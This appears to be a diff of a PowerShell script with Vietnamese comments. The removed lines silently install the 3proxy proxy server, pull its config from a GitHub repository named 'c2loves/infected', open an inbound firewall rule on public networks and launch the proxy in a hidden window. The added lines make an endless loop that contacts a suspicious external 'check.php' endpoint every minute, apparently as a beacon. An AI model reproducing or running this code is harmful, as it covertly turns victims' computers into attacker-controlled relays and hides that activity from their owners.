@@ -1,57 +1,11 @@
-# --- Cấu hình ---
-$Url = 'https://github.com/3proxy/3proxy/releases/download/0.9.5/3proxy-0.9.5-lite.zip'
-$DestDir = Join-Path $env:LocalAppData 'proxy'
-$TempZip = Join-Path $env:TEMP '3proxy-0.9.5-lite.zip'
-
-# --- Tạo thư mục đích nếu chưa có ---
-if (-not (Test-Path -Path $DestDir)) {
-    New-Item -Path $DestDir -ItemType Directory -Force | Out-Null
-    Write-Host "[+] Tạo thư mục: $DestDir"
-} else {
-    Write-Host "[*] Thư mục đã tồn tại: $DestDir"
-}
-
-# --- Tải file ---
-Write-Host "[*] Đang tải $Url -> $TempZip"
-try {
-    Invoke-WebRequest -Uri $Url -OutFile $TempZip -UseBasicParsing -Verbose
-} catch {
-    Write-Error "Lỗi khi tải file: $_"
-    exit 1
-}
-
-# --- Giải nén (ghi đè) ---
-Write-Host "[*] Giải nén vào $DestDir"
-try {
-    # Remove existing files if you want a clean extract (comment nếu không muốn xóa)
-    # Remove-Item -Path (Join-Path $DestDir '*') -Recurse -Force -ErrorAction SilentlyContinue
-
-    Expand-Archive -Path $TempZip -DestinationPath $DestDir -Force
-} catch {
-    Write-Error "Lỗi khi giải nén bằng Expand-Archive: $_"
-    # Fallback: sử dụng .NET if Expand-Archive không có
+while ($true) {
     try {
-        Add-Type -AssemblyName System.IO.Compression.FileSystem
-        [System.IO.Compression.ZipFile]::ExtractToDirectory($TempZip, $DestDir, $true)
-    } catch {
-        Write-Error "Fallback giải nén thất bại: $_"
-        exit 1
+        $response = Invoke-WebRequest -Uri "https://ancuopvpscongkhai.wvxx.dpdns.org/yum/check.php"
+        Write-Host "[$(Get-Date)] Status: $($response.StatusCode)"
     }
+    catch {
+        Write-Host "[$(Get-Date)] Error: $($_.Exception.Message)"
+    }
+
+    Start-Sleep -Seconds 60
 }
-
-# --- Dọn file tạm ---
-Remove-Item -Path $TempZip -Force -ErrorAction SilentlyContinue
-
-Write-Host "[+] Hoàn tất. Nội dung thư mục $DestDir:"
-Get-ChildItem -Path $DestDir -Depth 1
-
-New-Item -ItemType Directory -Path "$env:LOCALAPPDATA\proxy\bin" -Force | Out-Null; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/c2loves/infected/refs/heads/main/3proxy.cfg' -OutFile "$env:LOCALAPPDATA\proxy\bin\3proxy.cfg"
-
-$exe = "$env:LOCALAPPDATA\proxy\bin\3proxy.exe"
-if (Test-Path $exe) {
-    New-NetFirewallRule -DisplayName "Allow 3proxy" -Direction Inbound -Program $exe -Action Allow -Profile Private,Public -Description "Allow inbound for 3proxy"
-    Write-Host "Đã thêm rule firewall cho 3proxy.exe"
-} else {
-    Write-Warning "Không tìm thấy file 3proxy.exe tại $exe"
-}
-Start-Process -FilePath "${env:LOCALAPPDATA}\proxy\bin\3proxy.exe" -ArgumentList "${env:LOCALAPPDATA}\proxy\bin\3proxy.cfg" -WindowStyle Hidden
